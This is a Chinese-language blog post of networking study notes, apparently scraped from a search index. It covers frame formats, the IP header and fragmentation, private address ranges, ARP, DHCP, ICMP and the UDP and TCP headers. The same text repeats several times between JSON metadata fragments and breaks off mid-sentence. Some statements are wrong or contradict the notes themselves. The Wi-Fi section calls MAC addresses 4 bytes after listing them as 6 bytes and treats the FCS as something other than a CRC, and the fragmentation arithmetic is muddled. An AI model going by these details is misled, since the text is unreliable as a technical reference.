4B 的整数倍 协议名 ICMP IGMP TCP EGP IGP UDP IPv6 ESP OSPF 字段值 1 2 6 8 9 17 41 50 89 IP 数据报分片由于 MTU 最大 1500 的限制, 如果发送大于 1500-20 (ip 头部最小为 20 byte)=1480 的数据, 就需要分片.不会考虑 TCP 头, 也就是说 TCP 头只会在第一个分片中存在. 标识：占 16 位，同一数据报的分片使用同一标识 标志：占 3 位，只有两位有意义 x _ _ 中间位 DF（Don’t Fragment） DF = 1，禁止分片 DF = 0，允许分片 最低位 MF（More Fragment） MF = 1，后面还有分片 MF = 0，代表最后一片 / 没分片 片偏移：指出较长分组分片后，某片在原分组中的相对位置。（以 8B 为单位） 除了最后一片，每个分片长度一定是 8B 的整数倍 假设我要发送 3800 byte 的数据,tcp 头 24 byte,组成的数据包 3824 byte. 最大数据量为 1500-24 = 1476 byte. 要被 8 整除. 所以最大数据量为 1472/8=184 . 3800 / 1472 = 2.58…. = 3 次. 数据 总长度 标识 MF DF 片偏移 原始数据包 3800+24=3824 12345 0 0 0 数据包 1 1472+24=1496 12345 1 0 0 数据包 2 1472+24=1496 12345 1 0 184 数据包 3 856+24=880 12345 0 0 368 私有 IP 地址 CIDR 标识 地址范围 IP 个数 10.0.0.0/8 10.0.0.0~10.255.255.255 16,777,216 172.16.0.0/12 172.16.0.0~172.31.255.255 1,048,576 192.168.0.0/16 192.168.0.0~192.168.255.255 65,536 ARP/RARP 协议 ARP: 通过 ip 获取物理 mac 地址. 发送 arp 广播, 目标机器响应结果. 此协议互信, 所以可以伪造 ARP 响应包, 目标一旦缓存了错误的数据, 目标就会将数据发送给伪造者. RARP: 通过 mac 地址获取 ip 地址. 广播 mac 地址, RARP 服务器检查后, 返回 IP 地址, 不存在则不响应. DHCP 协议DHCP 协议过程： 主机广播 DHCP 发现报文 “有没有 DHCP 服务器呀” 试图找到网络中的服务器，向服务器获得一个 IP 地址 DHCP 服务器广播 DHCP 提供报文 “有！有！有！” 服务器拟分配给主机一个 IP 地址及相关配置，先到先得 主机广播 DHCP 请求报文 “我用你给我的 IP 地址啦？” 主机向服务器请求提供 IP 地址 DHCP 服务器广播 DHCP 确认报文 “用吧！” 正式将 IP 地址分配给主机 ICMP 协议 Ping 测试连通性. 发送数据包, 通常远端会返回响应. 但防火墙之类的也可以不响应. Tracertoute 跟踪数据包流转的路径. 每次经过节点都会 ttl-1 .同时如果为 0, 当前节点就会返回响应. 所以可以不断尝试, 拿到路由路径. 传输层 UDP UDP 是无连接的，减少开销和发送数据之间的时延 UDP 使用最大努力交付，即不保证可靠交付 UDP 是面向报文的，适合一次性传输少量数据的网络应用. 对于应用层交付的报文，直接原封不动的封装到 UDP 数据报的数据部分，即一次发一个完整的报文 UDP 无拥塞控制，适合很多实时应用. 例如直播 UDP 首部开销很小，8 byte，TCP 需要 20 byte UDP 的头部格式 TCP TCP 的头部格式 头部最小 20 字节, 也就是说发送 1 字节的数据, ip 头 +tcp 头需要 41 字节. **序号（seq）：**在一个 TCP 连接中传送的字节流中的每一个字节都按序编号，本字段表示本报文段所发送数据的第一个字节的序号 **确认号（ack）：**期望收到对方下一个报文段的第一个数据字节的序号。如果确认号为 N，则证明到序号 N - 1 为止的所有数据都已正确收到 **数据偏移（首部长度）：**TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远，以 4B 为单位，即 1 个数值是 4B **紧急位 URG：**URG = 1 时，表示此报文段中有紧急数据，是高优先级的数据，应尽快传送，不用再缓存里排队，配合紧急指针字段使用 **确认位 ACK：**ACK = 1 时确认号有效，在连接建立之后所有传送的报文段都必须把 ACK 置为 1 **推送位 PSH：**PSH = 1 时，接收方尽快交付接受应用程序，不再等到缓存填满再向上交付（和紧急位是对应的，紧急位是发送发优先发送，推送位是接收方优先向上交付） 复位 RST：RST = 1 时，表明 TCP 连接中出现严重差错，必须释放连接，然后再重新建立传输连接 同步位 SYN：SYN = 1 时，表明是一个连接请求/连接接收报文 **终止位 FIN：**FIN = 1 时，表明此报文段发送方数据已发送完，要求释放连接 **窗口：**指发送本报文段的一方的接收窗口，即现在允许对方发送的数据量 **检验和：**检验首部 + 数据，检验时要加上 12B 伪首部，伪首部第四个字段是 6 **紧急指针：**URG = 1 时才有意义，指出本报文段中紧急数据的字节数 **选项：**最大报文段","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:4","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#tcp-ip-协议栈"},{"categories":["blog"],"content":" 数据包详解 数据包示意图 数据链路层 帧 frame帧首部和尾部的大小并不一定. 以太网IEEE 802.3-以太网 帧的首部通常是 14 个字节（6 个字节的目标 MAC 地址，6 个字节的源 MAC 地址和 2 个字节的类型/长度字段）。帧尾部是 4 个字节的校验和字段。Ethernet frame - Wikipedia 因此，整个以太网帧的首部和尾部共占据 18 个字节的空间。VLAN 等衍生技术可能会增加额外字节 WIFIIEEE 802.11 的帧结构在设计上考虑了无线信道特性、多跳传输、移动性以及安全性等因素，以适应无线局域网环境中的需求。IEEE 802.11 - Wikipedia 最小是 32 字节,最小的组成为: 帧头部（Frame Header）：帧头部的长度为 28 个字节，包含以下字段： Frame Control：2 个字节，用于指示帧类型、子类型和其他控制信息。 Duration/ID：2 个字节，用于指示帧的持续时间或标识符。 Address 1-4：每个地址字段占 6 个字节，用于指示目标 MAC 地址、源 MAC 地址和其他相关地址。 Sequence Control：0 或 2 个字节，用于指示帧的序列号和片段编号。 Qos: 0 或 2 字节,流控 HT Controler: 0 或 4 字节,高吞吐量 帧尾部（Frame Footer）：帧尾部的长度为 4 个字节，包含 FCS（Frame Check Sequence）字段，用于进行帧的差错检测。 不同的原因: 帧类型字段： Wi-Fi 帧中包含一个帧类型字段，用于指示该帧的类型。帧类型字段可以表示数据帧、控制帧或管理帧。这有助于 Wi-Fi 设备在接收到帧时正确处理和解释其目的和功能。 MAC 地址格式： 以太网使用 6 字节的 MAC 地址来唯一标识网络设备，而 Wi-Fi 引入了扩展的 MAC 地址格式。Wi-Fi 的帧首部包含 4 字节的接收者 MAC 地址和 4 字节的发送者 MAC 地址。这样的设计支持更复杂的无线网络拓扑，例如多跳传输和移动设备的漫游。 序列控制字段： Wi-Fi 帧中包含一个序列控制字段，用于维护帧的传输顺序和可靠性。序列控制字段包括分片编号、片段计数和帧序列号等信息，以确保帧在无线信道上传输和组装时的正确顺序。 帧校验序列（FCS）： 以太网帧使用循环冗余校验（CRC）字段来检测帧的传输错误，而 Wi-Fi 帧使用一个更复杂的 FCS 字段来实现错误检测。FCS 字段包含了更强大的校验算法，以提高对无线信道上的干扰和误码的容错能力。 MTUMTU 如果设置太大, 可能被路由器拒绝转发. 太小又会导致效率低. windows 查看 MTU netsh.exe interface ipv4 show subinterfaces linux 查看 MTU ip a 网络层 TCP-IP 协议栈 IP 数据报格式 版本：占 4 位，指 IP 协议的版本。（IPv4/IPv6） 首部长度：占 4 位，单位是 4B，最小为 5（因为首部固定部分 20B，5 * 4B = 20B），最大为 15（15 * 4B = 60B） 区分服务：占 8 位，用来获取更好的服务（如：优先级），但实际上一直没有用过 总长度：占 16 位，首部 + 数据部分的总长度，单位是 1B，因此数据报的总长度为 标识/标志/片偏移是分片专用. IP 数据报分片 生存时间（TTL）：占 8 位，IP 分组的保质期，经过一个路由器就 -1，变为 0 则丢弃 协议：占 8 位，数据部分的协议，即传输层使用的是什么协议 首部检验和：占 16 位，只检验数据报的首部，但不包含数据部分。每经过一个路由器，都会重新计算一下首部检验和。 源地址：占 32 位 目的地址：占 32 位 可选字段：占 0 ~ 40 位，用来支持排错、测量以及安全措施 填充：全 0，把首部长度补成 4B 的整数倍 协议名 ICMP IGMP TCP EGP IGP UDP IPv6 ESP OSPF 字段值 1 2 6 8 9 17 41 50 89 IP 数据报分片由于 MTU 最大 1500 的限制, 如果发送大于 1500-20 (ip 头部最小为 20 byte)=1480 的数据, 就需要分片.不会考虑 TCP 头, 也就是说 TCP 头只会在第一个分片中存在. 标识：占 16 位，同一数据报的分片使用同一标识 标志：占 3 位，只有两位有意义 x _ _ 中间位 DF（Don’t Fragment） DF = 1，禁止分片 DF = 0，允许分片 最低位 MF（More Fragment） MF = 1，后面还有分片 MF = 0，代表最后一片 / 没分片 片偏移：指出较长分组分片后，某片在原分组中的相对位置。（以 8B 为单位） 除了最后一片，每个分片长度一定是 8B 的整数倍 假设我要发送 3800 byte 的数据,tcp 头 24 byte,组成的数据包 3824 byte. 最大数据量为 1500-24 = 1476 byte. 要被 8 整除. 所以最大数据量为 1472/8=184 . 3800 / 1472 = 2.58…. = 3 次. 数据 总长度 标识 MF DF 片偏移 原始数据包 3800+24=3824 12345 0 0 0 数据包 1 1472+24=1496 12345 1 0 0 数据包 2 1472+24=1496 12345 1 0 184 数据包 3 856+24=880 12345 0 0 368 私有 IP 地址 CIDR 标识 地址范围 IP 个数 10.0.0.0/8 10.0.0.0~10.255.255.255 16,777,216 172.16.0.0/12 172.16.0.0~172.31.255.255 1,048,576 192.168.0.0/16 192.168.0.0~192.168.255.255 65,536 ARP/RARP 协议 ARP: 通过 ip 获取物理 mac 地址. 发送 arp 广播, 目标机器响应结果. 此协议互信, 所以可以伪造 ARP 响应包, 目标一旦缓存了错误的数据, 目标就会将数据发送给伪造者. RARP: 通过 mac 地址获取 ip 地址. 广播 mac 地址, RARP 服务器检查后, 返回 IP 地址, 不存在则不响应. DHCP 协议DHCP 协议过程： 主机广播 DHCP 发现报文 “有没有 DHCP 服务器呀” 试图找到网络中的服务器，向服务器获得一个 IP 地址 DHCP 服务器广播 DHCP 提供报文 “有！有！有！” 服务器拟分配给主机一个 IP 地址及相关配置，先到先得 主机广播 DHCP 请求报文 “我用你给我的 IP 地址啦？” 主机向服务器请求提供 IP 地址 DHCP 服务器广播 DHCP 确认报文 “用吧！” 正式将 IP 地址分配给主机 ICMP 协议 Ping 测试连通性. 发送数据包, 通常远端会返回响应. 但防火墙之类的也可以不响应. Tracertoute 跟踪数据包流转的路径. 每次经过节点都会 ttl-1 .同时如果为 0, 当前节点就会返回响应. 所以可以不断尝试, 拿到路由路径. 传输层 UDP UDP 是无连接的，减少开销和发送数据之间的时延 UDP 使用最大努力交付，即不保证可靠交付 UDP 是面向报文的，适合一次性传输少量数据的网络应用. 对于应用层交付的报文，直接原封不动的封装到 UDP 数据报的数据部分，即一次发一个完整的报文 UDP 无拥塞控制，适合很多实时应用. 例如直播 UDP 首部开销很小，8 byte，TCP 需要 20 byte UDP 的头部格式 TCP TCP 的头部格式 头部最小 20 字节, 也就是说发送 1 字节的数据, ip 头 +tcp 头需要 41 字节. **序号（seq）：**在一个 TCP 连接中传送的字节流中的每一个字节都按序编号，本字段表示本报文段所发送数据的第一个字节的序号 **确认号（ack）：**期望收到对方下一个报文段的第一个数据字节的序号。如果确认号为 N，则证明到序号 N - 1 为止的所有数据都已正确收到 **数据偏移（首部长度）：**TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远，以 4B 为单位，即 1 个数值是 4B **紧急位 URG：**URG = 1 时，表示此报文段中有紧急数据，是高优先级的数据，应尽快传送，不用再缓存里排队，配合紧急指针字段使用 **确认位 ACK：**ACK = 1 时确认号有效，在连接建立之后所有传送的报文段都必须把 ACK 置为 1 **推送位 PSH：**PSH = 1 时，接收方尽快交付接受应用程序，不再等到缓存填满再向上交付（和紧急位是对应的，紧急位是发送发优先发送，推送位是接收方优先向上交付） 复位 RST：RST = 1 时，表明 TCP 连接中出现严重差错，必须释放连接，然后再重新建立传输连接 同步位 SYN：SYN = 1 时，表明是一个连接请求/连接接收报文 **终止位 FIN：**FIN = 1 时，表明此报文段发送方数据已发送完，要求释放连接 **窗口：**指发送本报文段的一方的接收窗口，即现在允许对方发送的数据量 **检验和：**检验首部 + 数据，检验时要加上 12B 伪首部，伪首部第四个字段是 6 **紧急指针：**URG = 1 时才有意义，指出本报文段中紧急数据的字节数 **选项：**最大报文段","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:4","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#ip-数据报格式"},{"categories":["blog"],"content":" 数据包详解 数据包示意图 数据链路层 帧 frame帧首部和尾部的大小并不一定. 以太网IEEE 802.3-以太网 帧的首部通常是 14 个字节（6 个字节的目标 MAC 地址，6 个字节的源 MAC 地址和 2 个字节的类型/长度字段）。帧尾部是 4 个字节的校验和字段。Ethernet frame - Wikipedia 因此，整个以太网帧的首部和尾部共占据 18 个字节的空间。VLAN 等衍生技术可能会增加额外字节 WIFIIEEE 802.11 的帧结构在设计上考虑了无线信道特性、多跳传输、移动性以及安全性等因素，以适应无线局域网环境中的需求。IEEE 802.11 - Wikipedia 最小是 32 字节,最小的组成为: 帧头部（Frame Header）：帧头部的长度为 28 个字节，包含以下字段： Frame Control：2 个字节，用于指示帧类型、子类型和其他控制信息。 Duration/ID：2 个字节，用于指示帧的持续时间或标识符。 Address 1-4：每个地址字段占 6 个字节，用于指示目标 MAC 地址、源 MAC 地址和其他相关地址。 Sequence Control：0 或 2 个字节，用于指示帧的序列号和片段编号。 Qos: 0 或 2 字节,流控 HT Controler: 0 或 4 字节,高吞吐量 帧尾部（Frame Footer）：帧尾部的长度为 4 个字节，包含 FCS（Frame Check Sequence）字段，用于进行帧的差错检测。 不同的原因: 帧类型字段： Wi-Fi 帧中包含一个帧类型字段，用于指示该帧的类型。帧类型字段可以表示数据帧、控制帧或管理帧。这有助于 Wi-Fi 设备在接收到帧时正确处理和解释其目的和功能。 MAC 地址格式： 以太网使用 6 字节的 MAC 地址来唯一标识网络设备，而 Wi-Fi 引入了扩展的 MAC 地址格式。Wi-Fi 的帧首部包含 4 字节的接收者 MAC 地址和 4 字节的发送者 MAC 地址。这样的设计支持更复杂的无线网络拓扑，例如多跳传输和移动设备的漫游。 序列控制字段： Wi-Fi 帧中包含一个序列控制字段，用于维护帧的传输顺序和可靠性。序列控制字段包括分片编号、片段计数和帧序列号等信息，以确保帧在无线信道上传输和组装时的正确顺序。 帧校验序列（FCS）： 以太网帧使用循环冗余校验（CRC）字段来检测帧的传输错误，而 Wi-Fi 帧使用一个更复杂的 FCS 字段来实现错误检测。FCS 字段包含了更强大的校验算法，以提高对无线信道上的干扰和误码的容错能力。 MTUMTU 如果设置太大, 可能被路由器拒绝转发. 太小又会导致效率低. windows 查看 MTU netsh.exe interface ipv4 show subinterfaces linux 查看 MTU ip a 网络层 TCP-IP 协议栈 IP 数据报格式 版本：占 4 位，指 IP 协议的版本。（IPv4/IPv6） 首部长度：占 4 位，单位是 4B，最小为 5（因为首部固定部分 20B，5 * 4B = 20B），最大为 15（15 * 4B = 60B） 区分服务：占 8 位，用来获取更好的服务（如：优先级），但实际上一直没有用过 总长度：占 16 位，首部 + 数据部分的总长度，单位是 1B，因此数据报的总长度为 标识/标志/片偏移是分片专用. IP 数据报分片 生存时间（TTL）：占 8 位，IP 分组的保质期，经过一个路由器就 -1，变为 0 则丢弃 协议：占 8 位，数据部分的协议，即传输层使用的是什么协议 首部检验和：占 16 位，只检验数据报的首部，但不包含数据部分。每经过一个路由器，都会重新计算一下首部检验和。 源地址：占 32 位 目的地址：占 32 位 可选字段：占 0 ~ 40 位，用来支持排错、测量以及安全措施 填充：全 0，把首部长度补成 4B 的整数倍 协议名 ICMP IGMP TCP EGP IGP UDP IPv6 ESP OSPF 字段值 1 2 6 8 9 17 41 50 89 IP 数据报分片由于 MTU 最大 1500 的限制, 如果发送大于 1500-20 (ip 头部最小为 20 byte)=1480 的数据, 就需要分片.不会考虑 TCP 头, 也就是说 TCP 头只会在第一个分片中存在. 标识：占 16 位，同一数据报的分片使用同一标识 标志：占 3 位，只有两位有意义 x _ _ 中间位 DF（Don’t Fragment） DF = 1，禁止分片 DF = 0，允许分片 最低位 MF（More Fragment） MF = 1，后面还有分片 MF = 0，代表最后一片 / 没分片 片偏移：指出较长分组分片后，某片在原分组中的相对位置。（以 8B 为单位） 除了最后一片，每个分片长度一定是 8B 的整数倍 假设我要发送 3800 byte 的数据,tcp 头 24 byte,组成的数据包 3824 byte. 最大数据量为 1500-24 = 1476 byte. 要被 8 整除. 所以最大数据量为 1472/8=184 . 3800 / 1472 = 2.58…. = 3 次. 数据 总长度 标识 MF DF 片偏移 原始数据包 3800+24=3824 12345 0 0 0 数据包 1 1472+24=1496 12345 1 0 0 数据包 2 1472+24=1496 12345 1 0 184 数据包 3 856+24=880 12345 0 0 368 私有 IP 地址 CIDR 标识 地址范围 IP 个数 10.0.0.0/8 10.0.0.0~10.255.255.255 16,777,216 172.16.0.0/12 172.16.0.0~172.31.255.255 1,048,576 192.168.0.0/16 192.168.0.0~192.168.255.255 65,536 ARP/RARP 协议 ARP: 通过 ip 获取物理 mac 地址. 发送 arp 广播, 目标机器响应结果. 此协议互信, 所以可以伪造 ARP 响应包, 目标一旦缓存了错误的数据, 目标就会将数据发送给伪造者. RARP: 通过 mac 地址获取 ip 地址. 广播 mac 地址, RARP 服务器检查后, 返回 IP 地址, 不存在则不响应. DHCP 协议DHCP 协议过程： 主机广播 DHCP 发现报文 “有没有 DHCP 服务器呀” 试图找到网络中的服务器，向服务器获得一个 IP 地址 DHCP 服务器广播 DHCP 提供报文 “有！有！有！” 服务器拟分配给主机一个 IP 地址及相关配置，先到先得 主机广播 DHCP 请求报文 “我用你给我的 IP 地址啦？” 主机向服务器请求提供 IP 地址 DHCP 服务器广播 DHCP 确认报文 “用吧！” 正式将 IP 地址分配给主机 ICMP 协议 Ping 测试连通性. 发送数据包, 通常远端会返回响应. 但防火墙之类的也可以不响应. Tracertoute 跟踪数据包流转的路径. 每次经过节点都会 ttl-1 .同时如果为 0, 当前节点就会返回响应. 所以可以不断尝试, 拿到路由路径. 传输层 UDP UDP 是无连接的，减少开销和发送数据之间的时延 UDP 使用最大努力交付，即不保证可靠交付 UDP 是面向报文的，适合一次性传输少量数据的网络应用. 对于应用层交付的报文，直接原封不动的封装到 UDP 数据报的数据部分，即一次发一个完整的报文 UDP 无拥塞控制，适合很多实时应用. 例如直播 UDP 首部开销很小，8 byte，TCP 需要 20 byte UDP 的头部格式 TCP TCP 的头部格式 头部最小 20 字节, 也就是说发送 1 字节的数据, ip 头 +tcp 头需要 41 字节. **序号（seq）：**在一个 TCP 连接中传送的字节流中的每一个字节都按序编号，本字段表示本报文段所发送数据的第一个字节的序号 **确认号（ack）：**期望收到对方下一个报文段的第一个数据字节的序号。如果确认号为 N，则证明到序号 N - 1 为止的所有数据都已正确收到 **数据偏移（首部长度）：**TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远，以 4B 为单位，即 1 个数值是 4B **紧急位 URG：**URG = 1 时，表示此报文段中有紧急数据，是高优先级的数据，应尽快传送，不用再缓存里排队，配合紧急指针字段使用 **确认位 ACK：**ACK = 1 时确认号有效，在连接建立之后所有传送的报文段都必须把 ACK 置为 1 **推送位 PSH：**PSH = 1 时，接收方尽快交付接受应用程序，不再等到缓存填满再向上交付（和紧急位是对应的，紧急位是发送发优先发送，推送位是接收方优先向上交付） 复位 RST：RST = 1 时，表明 TCP 连接中出现严重差错，必须释放连接，然后再重新建立传输连接 同步位 SYN：SYN = 1 时，表明是一个连接请求/连接接收报文 **终止位 FIN：**FIN = 1 时，表明此报文段发送方数据已发送完，要求释放连接 **窗口：**指发送本报文段的一方的接收窗口，即现在允许对方发送的数据量 **检验和：**检验首部 + 数据，检验时要加上 12B 伪首部，伪首部第四个字段是 6 **紧急指针：**URG = 1 时才有意义，指出本报文段中紧急数据的字节数 **选项：**最大报文段","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:4","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#ip-数据报分片"},{"categories":["blog"],"content":" 数据包详解 数据包示意图 数据链路层 帧 frame帧首部和尾部的大小并不一定. 以太网IEEE 802.3-以太网 帧的首部通常是 14 个字节（6 个字节的目标 MAC 地址，6 个字节的源 MAC 地址和 2 个字节的类型/长度字段）。帧尾部是 4 个字节的校验和字段。Ethernet frame - Wikipedia 因此，整个以太网帧的首部和尾部共占据 18 个字节的空间。VLAN 等衍生技术可能会增加额外字节 WIFIIEEE 802.11 的帧结构在设计上考虑了无线信道特性、多跳传输、移动性以及安全性等因素，以适应无线局域网环境中的需求。IEEE 802.11 - Wikipedia 最小是 32 字节,最小的组成为: 帧头部（Frame Header）：帧头部的长度为 28 个字节，包含以下字段： Frame Control：2 个字节，用于指示帧类型、子类型和其他控制信息。 Duration/ID：2 个字节，用于指示帧的持续时间或标识符。 Address 1-4：每个地址字段占 6 个字节，用于指示目标 MAC 地址、源 MAC 地址和其他相关地址。 Sequence Control：0 或 2 个字节，用于指示帧的序列号和片段编号。 Qos: 0 或 2 字节,流控 HT Controler: 0 或 4 字节,高吞吐量 帧尾部（Frame Footer）：帧尾部的长度为 4 个字节，包含 FCS（Frame Check Sequence）字段，用于进行帧的差错检测。 不同的原因: 帧类型字段： Wi-Fi 帧中包含一个帧类型字段，用于指示该帧的类型。帧类型字段可以表示数据帧、控制帧或管理帧。这有助于 Wi-Fi 设备在接收到帧时正确处理和解释其目的和功能。 MAC 地址格式： 以太网使用 6 字节的 MAC 地址来唯一标识网络设备，而 Wi-Fi 引入了扩展的 MAC 地址格式。Wi-Fi 的帧首部包含 4 字节的接收者 MAC 地址和 4 字节的发送者 MAC 地址。这样的设计支持更复杂的无线网络拓扑，例如多跳传输和移动设备的漫游。 序列控制字段： Wi-Fi 帧中包含一个序列控制字段，用于维护帧的传输顺序和可靠性。序列控制字段包括分片编号、片段计数和帧序列号等信息，以确保帧在无线信道上传输和组装时的正确顺序。 帧校验序列（FCS）： 以太网帧使用循环冗余校验（CRC）字段来检测帧的传输错误，而 Wi-Fi 帧使用一个更复杂的 FCS 字段来实现错误检测。FCS 字段包含了更强大的校验算法，以提高对无线信道上的干扰和误码的容错能力。 MTUMTU 如果设置太大, 可能被路由器拒绝转发. 太小又会导致效率低. windows 查看 MTU netsh.exe interface ipv4 show subinterfaces linux 查看 MTU ip a 网络层 TCP-IP 协议栈 IP 数据报格式 版本：占 4 位，指 IP 协议的版本。（IPv4/IPv6） 首部长度：占 4 位，单位是 4B，最小为 5（因为首部固定部分 20B，5 * 4B = 20B），最大为 15（15 * 4B = 60B） 区分服务：占 8 位，用来获取更好的服务（如：优先级），但实际上一直没有用过 总长度：占 16 位，首部 + 数据部分的总长度，单位是 1B，因此数据报的总长度为 标识/标志/片偏移是分片专用. IP 数据报分片 生存时间（TTL）：占 8 位，IP 分组的保质期，经过一个路由器就 -1，变为 0 则丢弃 协议：占 8 位，数据部分的协议，即传输层使用的是什么协议 首部检验和：占 16 位，只检验数据报的首部，但不包含数据部分。每经过一个路由器，都会重新计算一下首部检验和。 源地址：占 32 位 目的地址：占 32 位 可选字段：占 0 ~ 40 位，用来支持排错、测量以及安全措施 填充：全 0，把首部长度补成 4B 的整数倍 协议名 ICMP IGMP TCP EGP IGP UDP IPv6 ESP OSPF 字段值 1 2 6 8 9 17 41 50 89 IP 数据报分片由于 MTU 最大 1500 的限制, 如果发送大于 1500-20 (ip 头部最小为 20 byte)=1480 的数据, 就需要分片.不会考虑 TCP 头, 也就是说 TCP 头只会在第一个分片中存在. 标识：占 16 位，同一数据报的分片使用同一标识 标志：占 3 位，只有两位有意义 x _ _ 中间位 DF（Don’t Fragment） DF = 1，禁止分片 DF = 0，允许分片 最低位 MF（More Fragment） MF = 1，后面还有分片 MF = 0，代表最后一片 / 没分片 片偏移：指出较长分组分片后，某片在原分组中的相对位置。（以 8B 为单位） 除了最后一片，每个分片长度一定是 8B 的整数倍 假设我要发送 3800 byte 的数据,tcp 头 24 byte,组成的数据包 3824 byte. 最大数据量为 1500-24 = 1476 byte. 要被 8 整除. 所以最大数据量为 1472/8=184 . 3800 / 1472 = 2.58…. = 3 次. 数据 总长度 标识 MF DF 片偏移 原始数据包 3800+24=3824 12345 0 0 0 数据包 1 1472+24=1496 12345 1 0 0 数据包 2 1472+24=1496 12345 1 0 184 数据包 3 856+24=880 12345 0 0 368 私有 IP 地址 CIDR 标识 地址范围 IP 个数 10.0.0.0/8 10.0.0.0~10.255.255.255 16,777,216 172.16.0.0/12 172.16.0.0~172.31.255.255 1,048,576 192.168.0.0/16 192.168.0.0~192.168.255.255 65,536 ARP/RARP 协议 ARP: 通过 ip 获取物理 mac 地址. 发送 arp 广播, 目标机器响应结果. 此协议互信, 所以可以伪造 ARP 响应包, 目标一旦缓存了错误的数据, 目标就会将数据发送给伪造者. RARP: 通过 mac 地址获取 ip 地址. 广播 mac 地址, RARP 服务器检查后, 返回 IP 地址, 不存在则不响应. DHCP 协议DHCP 协议过程： 主机广播 DHCP 发现报文 “有没有 DHCP 服务器呀” 试图找到网络中的服务器，向服务器获得一个 IP 地址 DHCP 服务器广播 DHCP 提供报文 “有！有！有！” 服务器拟分配给主机一个 IP 地址及相关配置，先到先得 主机广播 DHCP 请求报文 “我用你给我的 IP 地址啦？” 主机向服务器请求提供 IP 地址 DHCP 服务器广播 DHCP 确认报文 “用吧！” 正式将 IP 地址分配给主机 ICMP 协议 Ping 测试连通性. 发送数据包, 通常远端会返回响应. 但防火墙之类的也可以不响应. Tracertoute 跟踪数据包流转的路径. 每次经过节点都会 ttl-1 .同时如果为 0, 当前节点就会返回响应. 所以可以不断尝试, 拿到路由路径. 传输层 UDP UDP 是无连接的，减少开销和发送数据之间的时延 UDP 使用最大努力交付，即不保证可靠交付 UDP 是面向报文的，适合一次性传输少量数据的网络应用. 对于应用层交付的报文，直接原封不动的封装到 UDP 数据报的数据部分，即一次发一个完整的报文 UDP 无拥塞控制，适合很多实时应用. 例如直播 UDP 首部开销很小，8 byte，TCP 需要 20 byte UDP 的头部格式 TCP TCP 的头部格式 头部最小 20 字节, 也就是说发送 1 字节的数据, ip 头 +tcp 头需要 41 字节. **序号（seq）：**在一个 TCP 连接中传送的字节流中的每一个字节都按序编号，本字段表示本报文段所发送数据的第一个字节的序号 **确认号（ack）：**期望收到对方下一个报文段的第一个数据字节的序号。如果确认号为 N，则证明到序号 N - 1 为止的所有数据都已正确收到 **数据偏移（首部长度）：**TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远，以 4B 为单位，即 1 个数值是 4B **紧急位 URG：**URG = 1 时，表示此报文段中有紧急数据，是高优先级的数据，应尽快传送，不用再缓存里排队，配合紧急指针字段使用 **确认位 ACK：**ACK = 1 时确认号有效，在连接建立之后所有传送的报文段都必须把 ACK 置为 1 **推送位 PSH：**PSH = 1 时，接收方尽快交付接受应用程序，不再等到缓存填满再向上交付（和紧急位是对应的，紧急位是发送发优先发送，推送位是接收方优先向上交付） 复位 RST：RST = 1 时，表明 TCP 连接中出现严重差错，必须释放连接，然后再重新建立传输连接 同步位 SYN：SYN = 1 时，表明是一个连接请求/连接接收报文 **终止位 FIN：**FIN = 1 时，表明此报文段发送方数据已发送完，要求释放连接 **窗口：**指发送本报文段的一方的接收窗口，即现在允许对方发送的数据量 **检验和：**检验首部 + 数据，检验时要加上 12B 伪首部，伪首部第四个字段是 6 **紧急指针：**URG = 1 时才有意义，指出本报文段中紧急数据的字节数 **选项：**最大报文段","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:4","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#私有-ip-地址"},{"categories":["blog"],"content":" 数据包详解 数据包示意图 数据链路层 帧 frame帧首部和尾部的大小并不一定. 以太网IEEE 802.3-以太网 帧的首部通常是 14 个字节（6 个字节的目标 MAC 地址，6 个字节的源 MAC 地址和 2 个字节的类型/长度字段）。帧尾部是 4 个字节的校验和字段。Ethernet frame - Wikipedia 因此，整个以太网帧的首部和尾部共占据 18 个字节的空间。VLAN 等衍生技术可能会增加额外字节 WIFIIEEE 802.11 的帧结构在设计上考虑了无线信道特性、多跳传输、移动性以及安全性等因素，以适应无线局域网环境中的需求。IEEE 802.11 - Wikipedia 最小是 32 字节,最小的组成为: 帧头部（Frame Header）：帧头部的长度为 28 个字节，包含以下字段： Frame Control：2 个字节，用于指示帧类型、子类型和其他控制信息。 Duration/ID：2 个字节，用于指示帧的持续时间或标识符。 Address 1-4：每个地址字段占 6 个字节，用于指示目标 MAC 地址、源 MAC 地址和其他相关地址。 Sequence Control：0 或 2 个字节，用于指示帧的序列号和片段编号。 Qos: 0 或 2 字节,流控 HT Controler: 0 或 4 字节,高吞吐量 帧尾部（Frame Footer）：帧尾部的长度为 4 个字节，包含 FCS（Frame Check Sequence）字段，用于进行帧的差错检测。 不同的原因: 帧类型字段： Wi-Fi 帧中包含一个帧类型字段，用于指示该帧的类型。帧类型字段可以表示数据帧、控制帧或管理帧。这有助于 Wi-Fi 设备在接收到帧时正确处理和解释其目的和功能。 MAC 地址格式： 以太网使用 6 字节的 MAC 地址来唯一标识网络设备，而 Wi-Fi 引入了扩展的 MAC 地址格式。Wi-Fi 的帧首部包含 4 字节的接收者 MAC 地址和 4 字节的发送者 MAC 